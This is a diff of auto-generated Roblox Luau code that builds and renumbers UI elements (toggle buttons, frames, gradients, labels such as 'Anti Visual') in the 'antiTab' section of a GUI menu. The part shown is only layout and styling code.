+G2L["1ba"]["PaddingRight"] = UDim.new(0, 3);
+G2L["1ba"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["1ba"]["PaddingBottom"] = UDim.new(0, 3);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.toggleFrame
-G2L["18d"] = Instance.new("Frame", G2L["18b"]);
-G2L["18d"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["18d"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["18d"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["18d"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["18d"]["Name"] = [[toggleFrame]];
+G2L["1bb"] = Instance.new("Frame", G2L["1b9"]);
+G2L["1bb"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["1bb"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["1bb"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1bb"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["1bb"]["Name"] = [[toggleFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.toggleFrame.outlineStroke
-G2L["18e"] = Instance.new("UIStroke", G2L["18d"]);
-G2L["18e"]["Thickness"] = 2;
-G2L["18e"]["Name"] = [[outlineStroke]];
+G2L["1bc"] = Instance.new("UIStroke", G2L["1bb"]);
+G2L["1bc"]["Thickness"] = 2;
+G2L["1bc"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.toggleFrame.toggleFade
-G2L["18f"] = Instance.new("CanvasGroup", G2L["18d"]);
-G2L["18f"]["BorderSizePixel"] = 0;
-G2L["18f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["18f"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["18f"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["18f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["18f"]["Name"] = [[toggleFade]];
+G2L["1bd"] = Instance.new("CanvasGroup", G2L["1bb"]);
+G2L["1bd"]["BorderSizePixel"] = 0;
+G2L["1bd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1bd"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1bd"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1bd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1bd"]["Name"] = [[toggleFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.button.toggleFrame.toggleFade.UIGradient
-G2L["190"] = Instance.new("UIGradient", G2L["18f"]);
-G2L["190"]["Rotation"] = 90;
-G2L["190"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["1be"] = Instance.new("UIGradient", G2L["1bd"]);
+G2L["1be"]["Rotation"] = 90;
+G2L["1be"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.text
-G2L["191"] = Instance.new("TextLabel", G2L["18a"]);
-G2L["191"]["TextWrapped"] = true;
-G2L["191"]["BorderSizePixel"] = 0;
-G2L["191"]["TextSize"] = 14;
-G2L["191"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["191"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["191"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["191"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["191"]["BackgroundTransparency"] = 1;
-G2L["191"]["Size"] = UDim2.new(0, 156, 0, 20);
-G2L["191"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["191"]["Text"] = [[Anti Maptide NaN]];
-G2L["191"]["Name"] = [[text]];
-G2L["191"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+G2L["1bf"] = Instance.new("TextLabel", G2L["1b8"]);
+G2L["1bf"]["TextWrapped"] = true;
+G2L["1bf"]["BorderSizePixel"] = 0;
+G2L["1bf"]["TextSize"] = 14;
+G2L["1bf"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["1bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1bf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1bf"]["BackgroundTransparency"] = 1;
+G2L["1bf"]["Size"] = UDim2.new(0, 156, 0, 20);
+G2L["1bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1bf"]["Text"] = [[Anti Maptide NaN]];
+G2L["1bf"]["Name"] = [[text]];
+G2L["1bf"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.text.UIPadding
-G2L["192"] = Instance.new("UIPadding", G2L["191"]);
-G2L["192"]["PaddingLeft"] = UDim.new(0, 5);
+G2L["1c0"] = Instance.new("UIPadding", G2L["1bf"]);
+G2L["1c0"]["PaddingLeft"] = UDim.new(0, 5);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.text.text
-G2L["193"] = Instance.new("UIStroke", G2L["191"]);
-G2L["193"]["Name"] = [[text]];
+G2L["1c1"] = Instance.new("UIStroke", G2L["1bf"]);
+G2L["1c1"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.maptidenan.UIPadding
-G2L["194"] = Instance.new("UIPadding", G2L["18a"]);
-G2L["194"]["PaddingLeft"] = UDim.new(0, 2);
+G2L["1c2"] = Instance.new("UIPadding", G2L["1b8"]);
+G2L["1c2"]["PaddingLeft"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---
-G2L["195"] = Instance.new("Frame", G2L["17e"]);
-G2L["195"]["BorderSizePixel"] = 0;
-G2L["195"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["195"]["Size"] = UDim2.new(1, 0, 0, 10);
-G2L["195"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["195"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["195"]["Name"] = [[---DIVIDER---]];
-G2L["195"]["LayoutOrder"] = 3;
-G2L["195"]["BackgroundTransparency"] = 1;
+G2L["1c3"] = Instance.new("Frame", G2L["1ac"]);
+G2L["1c3"]["BorderSizePixel"] = 0;
+G2L["1c3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1c3"]["Size"] = UDim2.new(1, 0, 0, 10);
+G2L["1c3"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["1c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1c3"]["Name"] = [[---DIVIDER---]];
+G2L["1c3"]["LayoutOrder"] = 3;
+G2L["1c3"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame
-G2L["196"] = Instance.new("Frame", G2L["195"]);
-G2L["196"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["196"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["196"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["196"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["196"]["Name"] = [[dividerFrame]];
+G2L["1c4"] = Instance.new("Frame", G2L["1c3"]);
+G2L["1c4"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["1c4"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["1c4"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1c4"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["1c4"]["Name"] = [[dividerFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.outlineStroke
-G2L["197"] = Instance.new("UIStroke", G2L["196"]);
-G2L["197"]["Thickness"] = 2;
-G2L["197"]["Name"] = [[outlineStroke]];
+G2L["1c5"] = Instance.new("UIStroke", G2L["1c4"]);
+G2L["1c5"]["Thickness"] = 2;
+G2L["1c5"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade
-G2L["198"] = Instance.new("CanvasGroup", G2L["196"]);
-G2L["198"]["BorderSizePixel"] = 0;
-G2L["198"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["198"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["198"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["198"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["198"]["Name"] = [[buttonFade]];
+G2L["1c6"] = Instance.new("CanvasGroup", G2L["1c4"]);
+G2L["1c6"]["BorderSizePixel"] = 0;
+G2L["1c6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1c6"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1c6"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1c6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1c6"]["Name"] = [[buttonFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
-G2L["199"] = Instance.new("UIGradient", G2L["198"]);
-G2L["199"]["Rotation"] = 90;
-G2L["199"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["1c7"] = Instance.new("UIGradient", G2L["1c6"]);
+G2L["1c7"]["Rotation"] = 90;
+G2L["1c7"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UIStroke
-G2L["19a"] = Instance.new("UIStroke", G2L["196"]);
-G2L["19a"]["Color"] = Color3.fromRGB(51, 51, 51);
-G2L["19a"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+G2L["1c8"] = Instance.new("UIStroke", G2L["1c4"]);
+G2L["1c8"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["1c8"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UICorner
-G2L["19b"] = Instance.new("UICorner", G2L["196"]);
+G2L["1c9"] = Instance.new("UICorner", G2L["1c4"]);
 
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.UIPadding
-G2L["19c"] = Instance.new("UIPadding", G2L["195"]);
-G2L["19c"]["PaddingTop"] = UDim.new(0, 3);
-G2L["19c"]["PaddingRight"] = UDim.new(0, 6);
-G2L["19c"]["PaddingLeft"] = UDim.new(0, 6);
-G2L["19c"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["1ca"] = Instance.new("UIPadding", G2L["1c3"]);
+G2L["1ca"]["PaddingTop"] = UDim.new(0, 3);
+G2L["1ca"]["PaddingRight"] = UDim.new(0, 6);
+G2L["1ca"]["PaddingLeft"] = UDim.new(0, 6);
+G2L["1ca"]["PaddingBottom"] = UDim.new(0, 3);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual
-G2L["19d"] = Instance.new("Frame", G2L["17e"]);
-G2L["19d"]["BorderSizePixel"] = 0;
-G2L["19d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["19d"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["19d"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["19d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["19d"]["Name"] = [[visual]];
-G2L["19d"]["LayoutOrder"] = 2;
-G2L["19d"]["BackgroundTransparency"] = 1;
+G2L["1cb"] = Instance.new("Frame", G2L["1ac"]);
+G2L["1cb"]["BorderSizePixel"] = 0;
+G2L["1cb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1cb"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["1cb"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["1cb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1cb"]["Name"] = [[visual]];
+G2L["1cb"]["LayoutOrder"] = 2;
+G2L["1cb"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button
-G2L["19e"] = Instance.new("TextButton", G2L["19d"]);
-G2L["19e"]["BorderSizePixel"] = 0;
-G2L["19e"]["TextTransparency"] = 1;
-G2L["19e"]["TextSize"] = 14;
-G2L["19e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["19e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["19e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["19e"]["BackgroundTransparency"] = 1;
-G2L["19e"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["19e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["19e"]["Name"] = [[button]];
+G2L["1cc"] = Instance.new("TextButton", G2L["1cb"]);
+G2L["1cc"]["BorderSizePixel"] = 0;
+G2L["1cc"]["TextTransparency"] = 1;
+G2L["1cc"]["TextSize"] = 14;
+G2L["1cc"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1cc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1cc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1cc"]["BackgroundTransparency"] = 1;
+G2L["1cc"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["1cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1cc"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.UIPadding
-G2L["19f"] = Instance.new("UIPadding", G2L["19e"]);
-G2L["19f"]["PaddingTop"] = UDim.new(0, 3);
-G2L["19f"]["PaddingRight"] = UDim.new(0, 3);
-G2L["19f"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["19f"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["1cd"] = Instance.new("UIPadding", G2L["1cc"]);
+G2L["1cd"]["PaddingTop"] = UDim.new(0, 3);
+G2L["1cd"]["PaddingRight"] = UDim.new(0, 3);
+G2L["1cd"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["1cd"]["PaddingBottom"] = UDim.new(0, 3);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.toggleFrame
-G2L["1a0"] = Instance.new("Frame", G2L["19e"]);
-G2L["1a0"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["1a0"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["1a0"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1a0"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["1a0"]["Name"] = [[toggleFrame]];
+G2L["1ce"] = Instance.new("Frame", G2L["1cc"]);
+G2L["1ce"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["1ce"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["1ce"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1ce"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["1ce"]["Name"] = [[toggleFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.toggleFrame.outlineStroke
-G2L["1a1"] = Instance.new("UIStroke", G2L["1a0"]);
-G2L["1a1"]["Thickness"] = 2;
-G2L["1a1"]["Name"] = [[outlineStroke]];
+G2L["1cf"] = Instance.new("UIStroke", G2L["1ce"]);
+G2L["1cf"]["Thickness"] = 2;
+G2L["1cf"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.toggleFrame.toggleFade
-G2L["1a2"] = Instance.new("CanvasGroup", G2L["1a0"]);
-G2L["1a2"]["BorderSizePixel"] = 0;
-G2L["1a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1a2"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1a2"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1a2"]["Name"] = [[toggleFade]];
+G2L["1d0"] = Instance.new("CanvasGroup", G2L["1ce"]);
+G2L["1d0"]["BorderSizePixel"] = 0;
+G2L["1d0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d0"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d0"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1d0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d0"]["Name"] = [[toggleFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.toggleFrame.toggleFade.UIGradient
-G2L["1a3"] = Instance.new("UIGradient", G2L["1a2"]);
-G2L["1a3"]["Rotation"] = 90;
-G2L["1a3"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["1d1"] = Instance.new("UIGradient", G2L["1d0"]);
+G2L["1d1"]["Rotation"] = 90;
+G2L["1d1"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.text
-G2L["1a4"] = Instance.new("TextLabel", G2L["19d"]);
-G2L["1a4"]["TextWrapped"] = true;
-G2L["1a4"]["BorderSizePixel"] = 0;
-G2L["1a4"]["TextSize"] = 14;
-G2L["1a4"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["1a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1a4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1a4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1a4"]["BackgroundTransparency"] = 1;
-G2L["1a4"]["Size"] = UDim2.new(0, 156, 0, 20);
-G2L["1a4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1a4"]["Text"] = [[Anti Visual]];
-G2L["1a4"]["Name"] = [[text]];
-G2L["1a4"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+G2L["1d2"] = Instance.new("TextLabel", G2L["1cb"]);
+G2L["1d2"]["TextWrapped"] = true;
+G2L["1d2"]["BorderSizePixel"] = 0;
+G2L["1d2"]["TextSize"] = 14;
+G2L["1d2"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["1d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1d2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d2"]["BackgroundTransparency"] = 1;
+G2L["1d2"]["Size"] = UDim2.new(0, 156, 0, 20);
+G2L["1d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d2"]["Text"] = [[Anti Visual]];
+G2L["1d2"]["Name"] = [[text]];
+G2L["1d2"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.text.UIPadding
-G2L["1a5"] = Instance.new("UIPadding", G2L["1a4"]);
-G2L["1a5"]["PaddingLeft"] = UDim.new(0, 5);
+G2L["1d3"] = Instance.new("UIPadding", G2L["1d2"]);
+G2L["1d3"]["PaddingLeft"] = UDim.new(0, 5);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.text.text
-G2L["1a6"] = Instance.new("UIStroke", G2L["1a4"]);
-G2L["1a6"]["Name"] = [[text]];
+G2L["1d4"] = Instance.new("UIStroke", G2L["1d2"]);
+G2L["1d4"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.UIPadding
-G2L["1a7"] = Instance.new("UIPadding", G2L["19d"]);
-G2L["1a7"]["PaddingLeft"] = UDim.new(0, 2);
+G2L["1d5"] = Instance.new("UIPadding", G2L["1cb"]);
+G2L["1d5"]["PaddingLeft"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire
-G2L["1a8"] = Instance.new("Frame", G2L["17e"]);
-G2L["1a8"]["BorderSizePixel"] = 0;
-G2L["1a8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1a8"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["1a8"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["1a8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1a8"]["Name"] = [[vampire]];
-G2L["1a8"]["LayoutOrder"] = 2;
-G2L["1a8"]["BackgroundTransparency"] = 1;
+G2L["1d6"] = Instance.new("Frame", G2L["1ac"]);
+G2L["1d6"]["BorderSizePixel"] = 0;
+G2L["1d6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d6"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["1d6"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["1d6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d6"]["Name"] = [[vampire]];
+G2L["1d6"]["LayoutOrder"] = 2;
+G2L["1d6"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button
-G2L["1a9"] = Instance.new("TextButton", G2L["1a8"]);
-G2L["1a9"]["BorderSizePixel"] = 0;
-G2L["1a9"]["TextTransparency"] = 1;
-G2L["1a9"]["TextSize"] = 14;
-G2L["1a9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1a9"]["BackgroundTransparency"] = 1;
-G2L["1a9"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["1a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1a9"]["Name"] = [[button]];
+G2L["1d7"] = Instance.new("TextButton", G2L["1d6"]);
+G2L["1d7"]["BorderSizePixel"] = 0;
+G2L["1d7"]["TextTransparency"] = 1;
+G2L["1d7"]["TextSize"] = 14;
+G2L["1d7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1d7"]["BackgroundTransparency"] = 1;
+G2L["1d7"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["1d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d7"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.UIPadding
-G2L["1aa"] = Instance.new("UIPadding", G2L["1a9"]);
-G2L["1aa"]["PaddingTop"] = UDim.new(0, 3);
-G2L["1aa"]["PaddingRight"] = UDim.new(0, 3);
-G2L["1aa"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["1aa"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["1d8"] = Instance.new("UIPadding", G2L["1d7"]);
+G2L["1d8"]["PaddingTop"] = UDim.new(0, 3);
+G2L["1d8"]["PaddingRight"] = UDim.new(0, 3);
+G2L["1d8"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["1d8"]["PaddingBottom"] = UDim.new(0, 3);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.toggleFrame
-G2L["1ab"] = Instance.new("Frame", G2L["1a9"]);
-G2L["1ab"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["1ab"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["1ab"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1ab"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["1ab"]["Name"] = [[toggleFrame]];
+G2L["1d9"] = Instance.new("Frame", G2L["1d7"]);
+G2L["1d9"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["1d9"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["1d9"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1d9"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["1d9"]["Name"] = [[toggleFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.toggleFrame.outlineStroke
-G2L["1ac"] = Instance.new("UIStroke", G2L["1ab"]);
-G2L["1ac"]["Thickness"] = 2;
-G2L["1ac"]["Name"] = [[outlineStroke]];
+G2L["1da"] = Instance.new("UIStroke", G2L["1d9"]);
+G2L["1da"]["Thickness"] = 2;
+G2L["1da"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.toggleFrame.toggleFade
-G2L["1ad"] = Instance.new("CanvasGroup", G2L["1ab"]);
-G2L["1ad"]["BorderSizePixel"] = 0;
-G2L["1ad"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1ad"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ad"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ad"]["Name"] = [[toggleFade]];
+G2L["1db"] = Instance.new("CanvasGroup", G2L["1d9"]);
+G2L["1db"]["BorderSizePixel"] = 0;
+G2L["1db"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1db"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1db"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1db"]["Name"] = [[toggleFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.toggleFrame.toggleFade.UIGradient
-G2L["1ae"] = Instance.new("UIGradient", G2L["1ad"]);
-G2L["1ae"]["Rotation"] = 90;
-G2L["1ae"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["1dc"] = Instance.new("UIGradient", G2L["1db"]);
+G2L["1dc"]["Rotation"] = 90;
+G2L["1dc"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.text
